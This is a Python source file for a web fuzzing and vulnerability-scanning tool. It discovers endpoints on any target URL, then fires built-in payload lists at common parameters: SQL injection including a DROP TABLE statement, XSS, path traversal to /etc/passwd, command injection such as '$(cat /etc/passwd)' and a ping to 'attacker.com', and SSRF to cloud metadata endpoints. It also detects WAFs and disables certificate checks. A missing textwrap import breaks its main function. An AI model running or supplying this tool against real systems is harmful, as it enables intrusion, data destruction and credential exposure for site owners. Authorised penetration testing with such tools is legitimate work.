
import requests
import argparse
import time
import logging
import concurrent.futures
import urllib.parse
import json
import sys
from typing import List, Dict, Optional
from datetime import datetime
from pathlib import Path
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class WebFuzzer:
    def __init__(self, target_url: str, wordlist_path: str = None, 
                 rate_limit: float = 0.1, threads: int = 5,
                 output_dir: str = "fuzzing_results"):
        """
        Initialize the WebFuzzer with target URL and configuration
        """
        self.target_url = target_url.rstrip('/')
        self.wordlist_path = wordlist_path
        self.rate_limit = rate_limit
        self.threads = threads
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        
        self.discovered_endpoints = set()
        self.vulnerable_params = []
        self.setup_logging()
        
        # Enhanced payload dictionary for vulnerability testing
        self.param_payloads = {
            'sql_injection': [
                "'", "1' OR '1'='1", "' OR 1=1 --", "' OR 'x'='x",
                "1; DROP TABLE users", "1 UNION SELECT null, version() --",
                "' UNION SELECT @@version --", "admin' --"
            ],
            'xss': [
                "<script>alert(1)</script>", 
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "><script>alert(1)</script>",
                "';alert(1);//"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "/etc/passwd",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%252e%252e%252f/etc/passwd"
            ],
            'rce': [
                "$(cat /etc/passwd)",
                "; ls -la",
                "& dir",
                "| whoami",
                "; ping -c 1 attacker.com",
                "$(sleep 5)"
            ],
            'ssrf': [
                "http://localhost",
                "http://127.0.0.1",
                "http://[::1]",
                "http://169.254.169.254/",
                "http://metadata.google.internal/"
            ]
        }
        
    def setup_logging(self):
        """Configure logging settings"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = self.output_dir / f"fuzzing_{timestamp}.log"
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger('WebFuzzer')

    def load_wordlist(self) -> List[str]:
        """Load and parse the wordlist file"""
        if not self.wordlist_path:
            # Default minimal wordlist if none provided
            return ['admin', 'login', 'register', 'api', 'upload', 'download']
            
        try:
            with open(self.wordlist_path, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            self.logger.error(f"Error loading wordlist: {e}")
            return []

    def detect_waf(self, response: requests.Response) -> bool:
        """
        Detect if a Web Application Firewall (WAF) is present
        """
        waf_signatures = {
            'Cloudflare': ['cf-ray', '__cfduid', 'cf-cache-status'],
            'ModSecurity': ['Mod_Security', 'NOYB'],
            'Imperva': ['X-Iinfo', 'INCAP_FID'],
            'Akamai': ['X-Akamai-Transformed']
        }

        headers = str(response.headers)
        for waf, sigs in waf_signatures.items():
            if any(sig.lower() in headers.lower() for sig in sigs):
                self.logger.warning(f"Detected {waf} WAF")
                return True
        return False

    def fuzz_endpoint(self, path: str) -> Optional[requests.Response]:
        """
        Test a single endpoint with multiple HTTP methods
        """
        url = f"{self.target_url}/{path.lstrip('/')}"
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
        
        for method in methods:
            try:
                response = self.session.request(
                    method=method,
                    url=url,
                    allow_redirects=False,
                    verify=False,
                    timeout=10
                )
                time.sleep(self.rate_limit)

                if response.status_code != 404:
                    self.logger.info(
                        f"[+] Found endpoint: {url} "
                        f"(Method: {method}, Status: {response.status_code})"
                    )
                    
                    # Check for WAF
                    if self.detect_waf(response):
                        self.logger.warning(
                            f"WAF detected on {url}. Exercise caution with fuzzing."
                        )
                    
                    self.discovered_endpoints.add((url, method))
                    return response
                    
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Error testing {url} with {method}: {e}")
            except Exception as e:
                self.logger.error(f"Unexpected error for {url}: {e}")
        return None

    def analyze_response(self, response: requests.Response, payload: str) -> Dict:
        """
        Analyze response for potential vulnerabilities
        """
        analysis = {
            'potential_vuln': False,
            'type': None,
            'confidence': 0,
            'details': []
        }

        # Response time analysis (for time-based SQLi)
        if response.elapsed.total_seconds() > 5:
            analysis['details'].append('Unusual response time detected')
            analysis['confidence'] += 20

        # Status code analysis
        if response.status_code >= 500:
            analysis['details'].append('Server error indicates possible vulnerability')
            analysis['confidence'] += 30

        # Content analysis
        response_text = response.text.lower()
        error_patterns = {
            'sql_injection': [
                'sql', 'mysql', 'oracle', 'syntax', 'ORA-', 'PostgreSQL',
                'SQLServer', 'warning: mysql', 'database error'
            ],
            'xss': [
                payload.lower() if 'script' in payload.lower() else None,
                'on error', 'onerror', 'alert'
            ],
            'lfi': [
                'root:', '[boot loader]', 'win.ini', 'etc/passwd',
                'system32', 'windows\\system32'
            ],
            'rce': [
                'uid=', 'gid=', 'groups=', 'Program Files', 'root:',
                '/bin/bash', 'Directory of'
            ]
        }

        for vuln_type, patterns in error_patterns.items():
            if any(pattern and pattern in response_text for pattern in patterns):
                analysis['potential_vuln'] = True
                analysis['type'] = vuln_type
                analysis['confidence'] += 40
                analysis['details'].append(f'Found {vuln_type} indicators')

        return analysis

    def test_parameter_vulnerability(self, url: str, method: str, param: str, payload: str) -> None:
        """
        Test for vulnerabilities in parameters
        """
        try:
            data = {param: payload} if method == 'POST' else None
            params = {param: payload} if method == 'GET' else None
            
            response = self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                allow_redirects=False,
                verify=False,
                timeout=10
            )
            time.sleep(self.rate_limit)

            analysis = self.analyze_response(response, payload)
            
            if analysis['potential_vuln']:
                vuln_info = {
                    'url': url,
                    'method': method,
                    'parameter': param,
                    'payload': payload,
                    'type': analysis['type'],
                    'confidence': analysis['confidence'],
                    'details': analysis['details'],
                    'status_code': response.status_code
                }
                self.vulnerable_params.append(vuln_info)
                self.logger.warning(
                    f"[!] Potential {analysis['type']} vulnerability found at {url} "
                    f"with parameter {param} (Confidence: {analysis['confidence']}%)"
                )

        except Exception as e:
            self.logger.error(f"Error testing parameter {param} at {url}: {e}")

    def fuzz_parameters(self, url: str, method: str) -> None:
        """
        Test discovered endpoints for parameter vulnerabilities
        """
        common_params = [
            'id', 'page', 'file', 'path', 'search', 'query', 'redirect', 'url',
            'data', 'cmd', 'exec', 'command', 'username', 'password', 'input',
            'target', 'host', 'ip', 'port', 'callback', 'return', 'next'
        ]
        
        for param in common_params:
            for vuln_type, payloads in self.param_payloads.items():
                for payload in payloads:
                    self.test_parameter_vulnerability(url, method, param, payload)

    def generate_report(self, start_time: datetime) -> str:
        """Generate a detailed HTML report of findings"""
        end_time = datetime.now()
        duration = end_time - start_time
        
        timestamp = end_time.strftime("%Y%m%d_%H%M%S")
        report_path = self.output_dir / f"fuzzing_report_{timestamp}.html"
        
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Web Fuzzing Report - {self.target_url}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .container {{ max-width: 1200px; margin: 0 auto; }}
                .header {{ background-color: #f8f9fa; padding: 20px; border-radius: 5px; }}
                .section {{ margin: 20px 0; }}
                .vulnerability {{ 
                    background-color: #fff3cd; 
                    padding: 15px; 
                    margin: 10px 0; 
                    border-radius: 5px;
                }}
                .endpoint {{
                    background-color: #e9ecef;
                    padding: 10px;
                    margin: 5px 0;
                    border-radius: 5px;
                }}
                table {{ width: 100%; border-collapse: collapse; }}
                th, td {{ padding: 8px; text-align: left; border: 1px solid #ddd; }}
                th {{ background-color: #f8f9fa; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Web Fuzzing Report</h1>
                    <p>Target: {self.target_url}</p>
                    <p>Scan Duration: {duration}</p>
                    <p>Completed at: {end_time}</p>
                </div>

                <div class="section">
                    <h2>Discovered Endpoints ({len(self.discovered_endpoints)})</h2>
                    <div class="endpoints">
        """
        
        # Add discovered endpoints
        for url, method in sorted(self.discovered_endpoints):
            html_content += f"""
                        <div class="endpoint">
                            <strong>{method}:</strong> {url}
                        </div>
            """

        html_content += f"""
                    </div>
                </div>

                <div class="section">
                    <h2>Potential Vulnerabilities ({len(self.vulnerable_params)})</h2>
                    <table>
                        <tr>
                            <th>Type</th>
                            <th>URL</th>
                            <th>Method</th>
                            <th>Parameter</th>
                            <th>Confidence</th>
                            <th>Details</th>
                        </tr>
        """

        # Add vulnerabilities
        for vuln in self.vulnerable_params:
            html_content += f"""
                        <tr>
                            <td>{vuln['type']}</td>
                            <td>{vuln['url']}</td>
                            <td>{vuln['method']}</td>
                            <td>{vuln['parameter']}</td>
                            <td>{vuln['confidence']}%</td>
                            <td>{', '.join(vuln['details'])}</td>
                        </tr>
            """

        html_content += """
                    </table>
                </div>
            </div>
        </body>
        </html>
        """
        
        with open(report_path, 'w') as f:
            f.write(html_content)
        
        self.logger.info(f"HTML Report saved to: {report_path}")
        return str(report_path)

    def run(self):
        """Execute the fuzzing process"""
        self.logger.info(f"Starting fuzzing on target: {self.target_url}")
        start_time = datetime.now()
        
        # Phase 1: Endpoint Discovery
        self.logger.info("Starting endpoint discovery...")
        wordlist = self.load_wordlist()
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.fuzz_endpoint, wordlist)
        
        # Phase 2: Parameter Fuzzing
        self.logger.info("Starting parameter fuzzing on discovered endpoints...")
        for url, method in self.discovered_endpoints:
            self.fuzz_parameters(url, method)
        
        # Generate Report
        report_path = self.generate_report(start_time)
        
        self.logger.info(f"Fuzzing completed. Found {len(self.discovered_endpoints)} endpoints "
                        f"and {len(self.vulnerable_params)} potential vulnerabilities.")
        return report_path

def main():
    parser = argparse.ArgumentParser(
        description='Advanced Web Fuzzing Tool for Endpoint and Vulnerability Discovery',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''
            Example usage:
              python web_fuzzer.py -t https://example.com -w wordlist.txt -r 0.1 --threads 5
              
            Note: This tool should only be used on systems you have permission to test.
            Unauthorized testing can be illegal and unethical.
        ''')
    )
    
    parser.add_argument('-t', '--target', required=True,
                       help='Target URL to fuzz (e.g., https://example.com)')
    parser.add_argument('-w', '--wordlist',
                       help='Path to wordlist file for endpoint discovery')
    parser.add_argument('-r', '--rate-limit', type=float, default=0.1,
                       help='Rate limit between requests in seconds (default: 0.1)')
    parser.add_argument('--threads', type=int, default=5,
                       help='Number of concurrent threads (default: 5)')
    parser.add_argument('-o', '--output-dir', default='fuzzing_results',
                       help='Directory to store results (default: fuzzing_results)')
    
    args = parser.parse_args()
    
    try:
        fuzzer = WebFuzzer(
            target_url=args.target,
            wordlist_path=args.wordlist,
            rate_limit=args.rate_limit,
            threads=args.threads,
            output_dir=args.output_dir
        )
        
        report_path = fuzzer.run()
        print(f"\nFuzzing completed successfully! View the report at: {report_path}")
        
    except KeyboardInterrupt:
        print("\nFuzzing interrupted by user. Partial results may have been saved.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")

if __name__ == '__main__':
    main()